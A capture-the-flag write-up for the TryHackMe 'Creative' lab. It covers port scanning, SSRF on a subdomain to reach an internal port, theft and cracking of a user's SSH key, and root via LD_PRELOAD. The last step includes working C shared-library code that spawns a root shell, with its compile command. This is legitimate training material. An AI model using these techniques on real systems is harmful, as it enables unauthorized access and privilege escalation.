--------------

### CTF: THM
### Lab: Creative

--------------

![image](https://github.com/user-attachments/assets/2cde5215-f83e-42d3-a49a-8808077035a8)

--------------

- Rustscan's output

      ❯ rustscan -a 10.10.246.239  -- -Pn -sC -sV
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      Real hackers hack time ⌛
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 10.10.246.239:22
      Open 10.10.246.239:80
      [~] Starting Script(s)
      [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
      
      Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
      [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-10 18:05 WAT
      NSE: Loaded 156 scripts for scanning.
      NSE: Script Pre-scanning.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 18:05
      Completed NSE at 18:05, 0.00s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 18:05
      Completed NSE at 18:05, 0.00s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 18:05
      Completed NSE at 18:05, 0.00s elapsed
      Initiating Connect Scan at 18:05
      Scanning creative.thm (10.10.246.239) [2 ports]
      Discovered open port 22/tcp on 10.10.246.239
      Discovered open port 80/tcp on 10.10.246.239
      Completed Connect Scan at 18:05, 0.44s elapsed (2 total ports)
      Initiating Service scan at 18:05
      Scanning 2 services on creative.thm (10.10.246.239)
      Completed Service scan at 18:06, 6.39s elapsed (2 services on 1 host)
      NSE: Script scanning 10.10.246.239.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 18:06
      Completed NSE at 18:06, 26.75s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 18:06
      Completed NSE at 18:06, 9.60s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 18:06
      Completed NSE at 18:06, 0.01s elapsed
      Nmap scan report for creative.thm (10.10.246.239)
      Host is up, received user-set (0.21s latency).
      Scanned at 2024-11-10 18:05:57 WAT for 44s
      
      PORT   STATE SERVICE REASON  VERSION
      22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Lin
      | ssh-hostkey: 
      |   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsXwQrUw2YlhqFRnJpLvzHz5VnTqQ/XrEJU/JEiooZu4aPe4tiRdNQKB09stTOfaMUFsbXSYGjvf5u+gavNZOOTCQxEoKeZzPzxUJ0baNaHNuF4Xo3PpqiUr+qEZUyZJKNrH4O8hErH/2h7AUEPpPIo7zEK1ZzqFNWcpOqguYOFVZMag999UzNEj8Wx8Qj4LfTWKLubcYS9iKN+exbAxXOIdbpolVtIFh0mP/cm9WRhf0z9WR9tX1FvJ
      |   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAA4JrZXR5KvRK8Y=
      |   256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFf4qwz85WzZVwohJm4pYByLpBj7j2JiQp
      80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
      | http-methods: 
      |_  Supported Methods: GET HEAD
      |_http-server-header: nginx/1.18.0 (Ubuntu)
      |_http-title: Creative Studio | Free Bootstrap 4.3.x template
      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

- Subdomain's fuzzing with ffuf

![image](https://github.com/user-attachments/assets/b68a3272-7f39-4f08-a771-4593d66863ea)

- In subdomain `beta`, the index page allows users to load urls which is vulnerable to `SSRF`.I decided to fuzz for internal ports on the localhost.

![image](https://github.com/user-attachments/assets/81a3d933-1a17-4dc0-ba8d-7683af9ca47d)

- I fuzzed for ports with burp intruder and I discovered a directory listing on port `1337`.

![image](https://github.com/user-attachments/assets/92a5ec6d-fc57-4e3c-9b41-1cd610eba3dd)

- I was able to read the `id_rsa` file for user `saad`.

![image](https://github.com/user-attachments/assets/fce36a4c-4dc6-4b41-bdf2-1dcbe466dc2e)

- The `id_rsa` key requires a passphrase which I was able to crack with `john`.

![image](https://github.com/user-attachments/assets/95546ca2-5f43-42a9-b532-53fe0ece9a4a)

- SSH access
  
![image](https://github.com/user-attachments/assets/cc51b641-c616-4f1d-93a4-e83e35241a61)

----------------

### PRIVESC with LD_PRELOAD

- I discovered user `saad`'s password in his `.bash_history` file.

![image](https://github.com/user-attachments/assets/e9b6365f-fd63-409f-ab2e-74711b04edd3)

- I ran `sudo -l` and discovered that I can run `ping` as root.Also the `env` variable is set to `LD_PRELOAD`.

![image](https://github.com/user-attachments/assets/0bfcd362-a8c9-475f-853f-39deebca5d18)

- I compiled the code below to a  shared library.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

- I executed the bash instruction below to compile the code.

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

![image](https://github.com/user-attachments/assets/e1d668e7-d54f-4f05-b303-80541e68bdd4)

- Set `LD_PRELOAD` variable in conjuction with the binary you have sudo permission to execute.

![image](https://github.com/user-attachments/assets/7d7e86e6-146c-4a68-9ea4-433a06ec8395)

- Root!!!

![image](https://github.com/user-attachments/assets/b03506ab-24b0-443f-8c60-4dc7cf2e0b87)
------------------

### THANKS FOR READING!!!

------------------

### Reference:

- [LD_PRELOAD](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)

------------------












